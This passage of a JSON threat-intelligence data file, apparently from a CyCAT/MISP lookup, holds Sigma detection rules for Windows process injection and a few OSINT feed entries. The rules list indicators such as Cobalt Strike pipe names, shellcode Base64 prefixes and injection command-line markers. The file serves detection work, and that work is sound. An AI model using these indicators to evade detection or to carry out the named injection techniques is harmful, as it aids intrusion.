+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/06/27\ndescription: Detects a \"dllhost\" spawning with no commandline arguments which is a\n  very rare thing to happen and could indicate process injection activity or malware\n  mimicking similar system processes\ndetection:\n  condition: selection\n  selection:\n    CommandLine|endswith: dllhost.exe\n    Image|endswith: \\dllhost.exe\nfalsepositives:\n- Unlikely\nfields:\n- CommandLine\n- ParentCommandLine\nid: e7888eb1-13b0-4616-bd99-4bc0c2b054b9\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://redcanary.com/blog/child-processes/\n- https://nasbench.medium.com/what-is-the-dllhost-exe-process-actually-running-ef9fe4c19c08\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1055\ntitle: Dllhost Process With No CommandLine\n",
+                            "sigma:id": "e7888eb1-13b0-4616-bd99-4bc0c2b054b9",
+                            "title": "Dllhost Process With No CommandLine",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "9f2cc74d-78af-4eb2-bb64-9cd1d292b87b",
+                        "lookup_data": {
+                            "description": "Detects suspicious connections from Microsoft Sync Center to non-private IPs.",
+                            "raw": "author: elhoim\ndate: 2022/04/28\ndescription: Detects suspicious connections from Microsoft Sync Center to non-private\n  IPs.\ndetection:\n  condition: selection_mobsync and not filter\n  filter:\n    DestinationIp|startswith:\n    - '10.'\n    - 192.168.\n    - 172.16.\n    - 172.17.\n    - 172.18.\n    - 172.19.\n    - 172.20.\n    - 172.21.\n    - 172.22.\n    - 172.23.\n    - 172.24.\n    - 172.25.\n    - 172.26.\n    - 172.27.\n    - 172.28.\n    - 172.29.\n    - 172.30.\n    - 172.31.\n    DestinationIsIpv6: 'false'\n  selection_mobsync:\n    Image|endswith: \\mobsync.exe\nfalsepositives:\n- Unknown\nid: 9f2cc74d-78af-4eb2-bb64-9cd1d292b87b\nlevel: medium\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2022/06/02\nreferences:\n- https://redcanary.com/blog/intelligence-insights-november-2021/\nstatus: experimental\ntags:\n- attack.t1055\n- attack.t1218\n- attack.execution\n- attack.defense_evasion\ntitle: Microsoft Sync Center Suspicious Network Connections\n",
+                            "sigma:id": "9f2cc74d-78af-4eb2-bb64-9cd1d292b87b",
+                            "title": "Microsoft Sync Center Suspicious Network Connections",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "6309645e-122d-4c5b-bb2b-22e4f9c2fa42",
+                        "lookup_data": {
+                            "description": "Detects a possible remote threat creation with certain characteristics which are typical for Cobalt Strike beacons",
+                            "raw": "author: Olaf Hartong, Florian Roth (Nextron Systems), Aleksey Potapov, oscd.community\ndate: 2018/11/30\ndescription: Detects a possible remote threat creation with certain characteristics\n  which are typical for Cobalt Strike beacons\ndetection:\n  condition: selection\n  selection:\n    StartAddress|endswith:\n    - 0B80\n    - 0C7C\n    - 0C88\nfalsepositives:\n- Unknown\nid: 6309645e-122d-4c5b-bb2b-22e4f9c2fa42\nlevel: high\nlogsource:\n  category: create_remote_thread\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://medium.com/@olafhartong/cobalt-strike-remote-threads-detection-206372d11d0f\n- https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1055.001\ntitle: CobaltStrike Process Injection\n",
+                            "sigma:id": "6309645e-122d-4c5b-bb2b-22e4f9c2fa42",
+                            "title": "CobaltStrike Process Injection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "fe3ac066-98bb-432a-b1e7-a5229cb39d4a",
+                        "lookup_data": {
+                            "description": "Detects the creation of a named pipe used by known APT malware",
+                            "raw": "author: Florian Roth (Nextron Systems), blueteam0ps, elhoim\ndate: 2017/11/06\ndescription: Detects the creation of a named pipe used by known APT malware\ndetection:\n  condition: selection\n  selection:\n    PipeName:\n    - \\isapi_http\n    - \\isapi_dg\n    - \\isapi_dg2\n    - \\sdlrpc\n    - \\ahexec\n    - \\winsession\n    - \\lsassw\n    - \\46a676ab7f179e511e30dd2dc41bd388\n    - \\9f81f59bc58452127884ce513865ed20\n    - \\e710f28d59aa529d6792ca6ff0ca1b34\n    - \\rpchlp_3\n    - \\NamePipe_MoreWindows\n    - \\pcheap_reuse\n    - \\gruntsvc\n    - \\583da945-62af-10e8-4902-a8f205c72b2e\n    - \\bizkaz\n    - \\svcctl\n    - \\Posh*\n    - \\jaccdpqnvbrrxlaf\n    - \\csexecsvc\n    - \\6e7645c4-32c5-4fe3-aabf-e94c2f4370e7\n    - \\adschemerpc\n    - \\AnonymousPipe\n    - \\bc367\n    - \\bc31a7\n    - \\testPipe\n    - \\dce_3d\nfalsepositives:\n- Unknown\nid: fe3ac066-98bb-432a-b1e7-a5229cb39d4a\nlevel: critical\nlogsource:\n  category: pipe_created\n  definition: Note that you have to configure logging for Named Pipe Events in Sysmon\n    config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon\n    configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth\n    verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config,\n    https://github.com/olafhartong/sysmon-modular. How to test detection? You can\n    check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\n  product: windows\nmodified: 2022/03/15\nreferences:\n- https://securelist.com/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/71275/\n- https://securelist.com/faq-the-projectsauron-apt/75533/\n- https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\n- https://www.us-cert.gov/ncas/alerts/TA17-117A\n- https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\n- https://thedfirreport.com/2020/06/21/snatch-ransomware/\n- https://github.com/RiccardoAncarani/LiquidSnake\n- https://www.accenture.com/us-en/blogs/cyber-defense/turla-belugasturgeon-compromises-government-entity\n- https://us-cert.cisa.gov/ncas/analysis-reports/ar19-304a\n- https://download.bitdefender.com/resources/files/News/CaseStudies/study/115/Bitdefender-Whitepaper-PAC-A4-en-EN1.pdf\n- https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/\n- https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055\ntitle: Malicious Named Pipe\n",
+                            "sigma:id": "fe3ac066-98bb-432a-b1e7-a5229cb39d4a",
+                            "title": "Malicious Named Pipe",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e",
+                        "lookup_data": {
+                            "description": "Detects typical Dridex process patterns",
+                            "raw": "author: Florian Roth (Nextron Systems), oscd.community\ndate: 2019/01/10\ndescription: Detects typical Dridex process patterns\ndetection:\n  condition: selection1 or selection2 and (selection3 or selection4)\n  selection1:\n    CommandLine|contains|all:\n    - C:\\Users\\\n    - \\Desktop\\\n    Image|endswith: \\svchost.exe\n  selection2:\n    ParentImage|endswith: \\svchost.exe\n  selection3:\n    CommandLine|contains: all\n    Image|endswith: \\whoami.exe\n  selection4:\n    CommandLine|contains: view\n    Image|endswith:\n    - \\net.exe\n    - \\net1.exe\nfalsepositives:\n- Unlikely\nid: e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://app.any.run/tasks/993daa5e-112a-4ff6-8b5a-edbcec7c7ba3\nstatus: stable\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055\n- attack.discovery\n- attack.t1135\n- attack.t1033\ntitle: Dridex Process Pattern\n",
+                            "sigma:id": "e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e",
+                            "title": "Dridex Process Pattern",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "85adeb13-4fc9-4e68-8a4a-c7cb2c336eb7",
+                        "lookup_data": {
+                            "description": "Detects the creation of a named pipe with a pattern found in CobaltStrike malleable C2 profiles",
+                            "raw": "author: Florian Roth (Nextron Systems), Christian Burkard (Nextron Systems)\ndate: 2021/07/30\ndescription: Detects the creation of a named pipe with a pattern found in CobaltStrike\n  malleable C2 profiles\ndetection:\n  condition: 1 of selection_malleable_profile* and not filter\n  filter:\n    PipeName:\n    - \\wkssvc\n    - \\spoolss\n    - \\scerpc\n    - \\ntsvcs\n    - \\SearchTextHarvester\n    - \\PGMessagePipe\n    - \\MsFteWds\n  selection_malleable_profile_CatalogChangeListener:\n    PipeName|endswith: -0,\n    PipeName|startswith: \\Winsock2\\CatalogChangeListener-\n  selection_malleable_profiles:\n  - PipeName|startswith:\n    - \\mojo.5688.8052.183894939787088877\n    - \\mojo.5688.8052.35780273329370473\n    - \\mypipe-f\n    - \\mypipe-h\n    - \\ntsvcs\n    - \\scerpc\n    - \\win_svc\n    - \\spoolss\n    - \\msrpc_\n    - \\win\\msrpc_\n    - \\wkssvc\n    - \\f53f\n    - \\windows.update.manager\n    - \\SearchTextHarvester\n    - \\DserNamePipe\n    - \\PGMessagePipe\n    - \\MsFteWds\n    - \\f4c3\n    - \\fullduplex_\n    - \\rpc_\n  - PipeName:\n    - \\demoagent_11\n    - \\demoagent_22\nfalsepositives:\n- Chrome instances using the exact same pipe name \"mojo.something\"\nid: 85adeb13-4fc9-4e68-8a4a-c7cb2c336eb7\nlevel: high\nlogsource:\n  category: pipe_created\n  definition: Note that you have to configure logging for Named Pipe Events in Sysmon\n    config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon\n    configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth\n    verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config,\n    https://github.com/olafhartong/sysmon-modular You can also use other repo, e.g.\n    https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular.\n    How to test detection? You can always use Cobalt Strike, but also you can check\n    powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\n- https://gist.github.com/MHaggis/6c600e524045a6d49c35291a21e10752\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055\ntitle: CobaltStrike Named Pipe Patterns\n",
+                            "sigma:id": "85adeb13-4fc9-4e68-8a4a-c7cb2c336eb7",
+                            "title": "CobaltStrike Named Pipe Patterns",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e81528db-fc02-45e8-8e98-4e84aba1f10b",
+                        "lookup_data": {
+                            "description": "Detects suspicious network connection by Notepad",
+                            "raw": "author: EagleEye Team\ndate: 2020/05/14\ndescription: Detects suspicious network connection by Notepad\ndetection:\n  condition: selection and not filter\n  filter:\n    DestinationPort: 9100\n  selection:\n    Image|endswith: \\notepad.exe\nfalsepositives:\n- Unknown\nid: e81528db-fc02-45e8-8e98-4e84aba1f10b\nlevel: high\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2022/10/05\nreferences:\n- https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492186586.pdf\n- https://blog.cobaltstrike.com/2013/08/08/why-is-notepad-exe-connecting-to-the-internet/\nstatus: test\ntags:\n- attack.command_and_control\n- attack.execution\n- attack.defense_evasion\n- attack.t1055\ntitle: Notepad Making Network Connection\n",
+                            "sigma:id": "e81528db-fc02-45e8-8e98-4e84aba1f10b",
+                            "title": "Notepad Making Network Connection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd",
+                        "lookup_data": {
+                            "description": "Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/03/05\ndescription: Detects suspicious process related to rundll32 based on command line\n  that invokes inline VBScript as seen being used by UNC2452\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - rundll32.exe\n    - Execute\n    - RegRead\n    - window.close\nfalsepositives:\n- Unknown\nid: 1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1055\ntitle: Suspicious Rundll32 Invoking Inline VBScript\n",
+                            "sigma:id": "1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd",
+                            "title": "Suspicious Rundll32 Invoking Inline VBScript",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "637f689e-b4a5-4a86-be0e-0100a0a33ba2",
+                        "lookup_data": {
+                            "description": "Detects the pattern of a pipe name as used by the tool EfsPotato",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/08/23\ndescription: Detects the pattern of a pipe name as used by the tool EfsPotato\ndetection:\n  condition: selection and not filter\n  filter:\n    PipeName|contains: \\CtxShare\n  selection:\n    PipeName|contains:\n    - \\pipe\\\n    - \\pipe\\srvsvc\nfalsepositives:\n- Unknown\nid: 637f689e-b4a5-4a86-be0e-0100a0a33ba2\nlevel: high\nlogsource:\n  category: pipe_created\n  definition: Note that you have to configure logging for Named Pipe Events in Sysmon\n    config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon\n    configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth\n    verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config,\n    https://github.com/olafhartong/sysmon-modular. How to test detection? You can\n    check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\n  product: windows\nmodified: 2022/06/20\nreferences:\n- https://twitter.com/SBousseaden/status/1429530155291193354?s=20\n- https://github.com/zcgonvh/EfsPotato\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055\ntitle: EfsPotato Named Pipe\n",
+                            "sigma:id": "637f689e-b4a5-4a86-be0e-0100a0a33ba2",
+                            "title": "EfsPotato Named Pipe",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b7967e22-3d7e-409b-9ed5-cdae3f9243a1",
+                        "lookup_data": {
+                            "description": "Detects a process access to verclsid.exe that injects shellcode from a Microsoft Office application / VBA macro",
+                            "raw": "author: John Lambert (tech), Florian Roth (Nextron Systems)\ndate: 2017/03/04\ndescription: Detects a process access to verclsid.exe that injects shellcode from\n  a Microsoft Office application / VBA macro\ndetection:\n  combination1:\n    CallTrace|contains|all:\n    - '|UNKNOWN('\n    - VBE7.DLL\n  combination2:\n    CallTrace|contains: '|UNKNOWN'\n    SourceImage|contains: \\Microsoft Office\\\n  condition: selection and 1 of combination*\n  selection:\n    GrantedAccess: '0x1FFFFF'\n    TargetImage|endswith: \\verclsid.exe\nfalsepositives:\n- Unknown\nid: b7967e22-3d7e-409b-9ed5-cdae3f9243a1\nlevel: high\nlogsource:\n  category: process_access\n  definition: 'Use the following config to generate the necessary Event ID 10 Process\n    Access events: <ProcessAccess onmatch=\"include\"><CallTrace condition=\"contains\">VBE7.DLL</CallTrace></ProcessAccess><ProcessAccess\n    onmatch=\"exclude\"><CallTrace condition=\"excludes\">UNKNOWN</CallTrace></ProcessAccess>'\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://twitter.com/JohnLaTwC/status/837743453039534080\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055\ntitle: Malware Shellcode in Verclsid Target Process\n",
+                            "sigma:id": "b7967e22-3d7e-409b-9ed5-cdae3f9243a1",
+                            "title": "Malware Shellcode in Verclsid Target Process",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "abfb5a93-e695-4ee9-bc10-541290bcd663",
+                        "lookup_data": {
+                            "description": "Aoqin Dragon | Newly-Discovered Chinese-linked APT Has Been Quietly Spying On Organizations For 10 Years",
+                            "link": "http://www.botvrij.eu/data/feed-osint/abfb5a93-e695-4ee9-bc10-541290bcd663.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1655839499",
+                            "uuid": "abfb5a93-e695-4ee9-bc10-541290bcd663",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "17eb8e57-9983-420d-ad8a-2c4976c22eb8",
+                        "lookup_data": {
+                            "description": "Detects process injection using the signed Windows tool Mavinject32.exe",
+                            "raw": "author: Florian Roth\ndate: 2018/12/12\ndescription: Detects process injection using the signed Windows tool Mavinject32.exe\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: ' /INJECTRUNNING '\nfalsepositives:\n- unknown\nid: 17eb8e57-9983-420d-ad8a-2c4976c22eb8\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2020/09/01\nreferences:\n- https://twitter.com/gN3mes1s/status/941315826107510784\n- https://reaqta.com/2017/12/mavinject-microsoft-injector/\n- https://twitter.com/Hexacorn/status/776122138063409152\nstatus: experimental\ntags:\n- attack.t1055\n- attack.t1055.001\n- attack.t1218\ntitle: MavInject Process Injection\n",
+                            "sigma:id": "17eb8e57-9983-420d-ad8a-2c4976c22eb8",
+                            "title": "MavInject Process Injection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5c6baef6-fca0-446e-b0b1-ac45950d210f",
+                        "lookup_data": {
+                            "description": "Financial - socgen-compliance.com fake website delivering malicious documents",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5c6baef6-fca0-446e-b0b1-ac45950d210f.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1550562629",
+                            "uuid": "5c6baef6-fca0-446e-b0b1-ac45950d210f",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "16c37b52-b141-42a5-a3ea-bbe098444397",
+                        "lookup_data": {
+                            "description": "It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space.",
+                            "raw": "author: David Burkett, @signalblur\ndate: 2019/12/28\ndescription: It is extremely abnormal for svchost.exe to spawn without any CLI arguments\n  and is normally observed when a malicious process spawns the process and injects\n  code into the process memory space.\ndetection:\n  condition: selection and not filter\n  filter:\n  - ParentImage|endswith:\n    - \\rpcnet.exe\n    - \\rpcnetp.exe\n  - CommandLine: null\n  selection:\n    CommandLine|endswith: svchost.exe\n    Image|endswith: \\svchost.exe\nfalsepositives:\n- Rpcnet.exe / rpcnetp.exe which is a lojack style software. https://www.blackhat.com/docs/us-14/materials/us-14-Kamlyuk-Kamluk-Computrace-Backdoor-Revisited.pdf\nfields:\n- CommandLine\n- ParentCommandLine\nid: 16c37b52-b141-42a5-a3ea-bbe098444397\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/06/27\nreferences:\n- https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055\ntitle: Suspect Svchost Activity\n",
+                            "sigma:id": "16c37b52-b141-42a5-a3ea-bbe098444397",
+                            "title": "Suspect Svchost Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b655a06a-31c0-477a-95c2-3726b83d649d",
+                        "lookup_data": {
+                            "description": "Detects a suspicious child process of userinit",
+                            "raw": "author: Florian Roth (Nextron Systems), Samir Bousseaden (idea)\ndate: 2019/06/17\ndescription: Detects a suspicious child process of userinit\ndetection:\n  condition: selection and not 1 of filter*\n  filter1:\n    CommandLine|contains: \\netlogon\\\n  filter2:\n  - Image|endswith: \\explorer.exe\n  - OriginalFileName: explorer.exe\n  selection:\n    ParentImage|endswith: \\userinit.exe\nfalsepositives:\n- Administrative scripts\nfields:\n- CommandLine\n- ParentCommandLine\nid: b655a06a-31c0-477a-95c2-3726b83d649d\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/09\nreferences:\n- https://twitter.com/SBousseaden/status/1139811587760562176\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1055\ntitle: Suspicious Userinit Child Process\n",
+                            "sigma:id": "b655a06a-31c0-477a-95c2-3726b83d649d",
+                            "title": "Suspicious Userinit Child Process",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "33a2d1dd-f3b0-40bd-8baf-7974468927cc",
+                        "lookup_data": {
+                            "description": "Detects an image load pattern as seen when a tool named PRIVATELOG is used and rarely observed under legitimate circumstances",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/09/07\ndescription: Detects an image load pattern as seen when a tool named PRIVATELOG is\n  used and rarely observed under legitimate circumstances\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|endswith: \\clfsw32.dll\n    Image|endswith: \\svchost.exe\nfalsepositives:\n- Rarely observed\nid: 33a2d1dd-f3b0-40bd-8baf-7974468927cc\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.fireeye.com/blog/threat-research/2021/09/unknown-actor-using-clfs-log-files-for-stealth.html\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055\ntitle: APT PRIVATELOG Image Load Pattern\n",
+                            "sigma:id": "33a2d1dd-f3b0-40bd-8baf-7974468927cc",
+                            "title": "APT PRIVATELOG Image Load Pattern",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "3c1b5fb0-c72f-45ba-abd1-4d4c353144ab",
+                        "lookup_data": {
+                            "description": "Detects process creation events that use the Sysnative folder (common for CobaltStrike spawns)",
+                            "raw": "author: Max Altgelt (Nextron Systems)\ndate: 2022/08/23\ndescription: Detects process creation events that use the Sysnative folder (common\n  for CobaltStrike spawns)\ndetection:\n  condition: sysnative\n  sysnative:\n    CommandLine|startswith: C:\\Windows\\Sysnative\\\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 3c1b5fb0-c72f-45ba-abd1-4d4c353144ab\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/\nstatus: experimental\ntags:\n- attack.t1055\ntitle: Process Creation Using Sysnative Folder\n",
+                            "sigma:id": "3c1b5fb0-c72f-45ba-abd1-4d4c353144ab",
+                            "title": "Process Creation Using Sysnative Folder",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5dbae98e-7974-4480-86db-44be950d210f",
+                        "lookup_data": {
+                            "description": "OSINT - Dans lâ€™Å“il de notre CyberSOC : la campagne malspam Aggah diversifie ses outils",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5dbae98e-7974-4480-86db-44be950d210f.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1575969880",
+                            "uuid": "5dbae98e-7974-4480-86db-44be950d210f",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "6345b048-8441-43a7-9bed-541133633d7a",
+                        "lookup_data": {
+                            "description": "Detects suspicious process injection using ZOHO's dctask64.exe",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/01/28\ndescription: Detects suspicious process injection using ZOHO's dctask64.exe\ndetection:\n  condition: selection and not filter\n  filter:\n    CommandLine|contains: DesktopCentral_Agent\\agent\n  selection:\n    Image|endswith: \\dctask64.exe\nfalsepositives:\n- Unknown yet\nfields:\n- CommandLine\n- ParentCommandLine\n- ParentImage\nid: 6345b048-8441-43a7-9bed-541133633d7a\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://twitter.com/gN3mes1s/status/1222088214581825540\n- https://twitter.com/gN3mes1s/status/1222095963789111296\n- https://twitter.com/gN3mes1s/status/1222095371175911424\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1055.001\ntitle: ZOHO Dctask64 Process Injection\n",
+                            "sigma:id": "6345b048-8441-43a7-9bed-541133633d7a",
+                            "title": "ZOHO Dctask64 Process Injection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "16b37b70-6fcf-4814-a092-c36bd3aafcbd",
+                        "lookup_data": {
+                            "description": "Detects Base64 encoded Shellcode",
+                            "raw": "author: David Ledbetter (shellcode), Florian Roth (Nextron Systems)\ndate: 2018/11/17\ndescription: Detects Base64 encoded Shellcode\ndetection:\n  condition: selection and selection2\n  selection:\n    ScriptBlockText|contains: AAAAYInlM\n  selection2:\n    ScriptBlockText|contains:\n    - OiCAAAAYInlM\n    - OiJAAAAYInlM\nfalsepositives:\n- Unknown\nid: 16b37b70-6fcf-4814-a092-c36bd3aafcbd\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://twitter.com/cyb3rops/status/1063072865992523776\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055\n- attack.execution\n- attack.t1059.001\ntitle: PowerShell ShellCode\n",
+                            "sigma:id": "16b37b70-6fcf-4814-a092-c36bd3aafcbd",
+                            "title": "PowerShell ShellCode",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "744a188b-0415-4792-896f-11ddb0588dbc",
+                        "lookup_data": {
+                            "description": "Detects process injection using Microsoft Remote Asssistance (Msra.exe) which has been used for discovery and persistence tactics",
+                            "raw": "author: Alexander McDonald\ndate: 2022/06/24\ndescription: Detects process injection using Microsoft Remote Asssistance (Msra.exe)\n  which has been used for discovery and persistence tactics\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\arp.exe\n    - \\cmd.exe\n    - \\net.exe\n    - \\netstat.exe\n    - \\nslookup.exe\n    - \\route.exe\n    - \\schtasks.exe\n    - \\whoami.exe\n    ParentCommandLine|endswith: msra.exe\n    ParentImage|endswith: \\msra.exe\nfalsepositives:\n- Legitimate use of Msra.exe\nid: 744a188b-0415-4792-896f-11ddb0588dbc\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.microsoft.com/security/blog/2021/12/09/a-closer-look-at-qakbots-latest-building-blocks-and-how-to-knock-them-down/\n- https://www.fortinet.com/content/dam/fortinet/assets/analyst-reports/ar-qakbot.pdf\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1055\ntitle: Msra.exe Process Injection\n",
+                            "sigma:id": "744a188b-0415-4792-896f-11ddb0588dbc",
+                            "title": "Msra.exe Process Injection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5f113a8f-8b61-41ca-b90f-d374fa7e4a39",
+                        "lookup_data": {
+                            "description": "Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --> kernelbase.dll --> unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
+                            "raw": "author: Perez Diego (@darkquassar), oscd.community, Jonhnathan Ribeiro\ndate: 2019/10/27\ndescription: Detects the access to processes by other suspicious processes which have\n  reflectively loaded libraries in their memory space. An example is SilentTrinity\n  C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack\n  call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as\n  the module name. Usually this means the stack call points to a module that was reflectively\n  loaded in memory. Adding to this, it is not common to see such few calls in the\n  stack (ntdll.dll --> kernelbase.dll --> unknown) which essentially means that most\n  of the functions required by the process to execute certain routines are already\n  present in memory, not requiring any calls to external libraries. The latter should\n  also be considered suspicious.\ndetection:\n  condition: (selection1 or selection2) or (selection3 and granted_access) and not\n    filter\n  filter:\n    SourceImage|endswith:\n    - \\Windows\\System32\\sdiagnhost.exe\n  granted_access:\n    GrantedAccess:\n    - '0x1F0FFF'\n    - '0x1F1FFF'\n    - '0x143A'\n    - '0x1410'\n    - '0x1010'\n    - '0x1F2FFF'\n    - '0x1F3FFF'\n    - '0x1FFFFF'\n  selection1:\n    CallTrace|contains|all:\n    - C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+\n    - '|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+'\n    - '|UNKNOWN('\n    - )\n  selection2:\n    CallTrace|contains|all:\n    - UNKNOWN(\n    - )|UNKNOWN(\n    CallTrace|endswith: )\n  selection3:\n    CallTrace|contains: UNKNOWN\nfalsepositives:\n- Low\nfields:\n- ComputerName\n- User\n- SourceImage\n- TargetImage\n- CallTrace\nid: 5f113a8f-8b61-41ca-b90f-d374fa7e4a39\nlevel: critical\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2021/05/16\nreferences:\n- https://azure.microsoft.com/en-ca/blog/detecting-in-memory-attacks-with-sysmon-and-azure-security-center/\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1055.001\n- 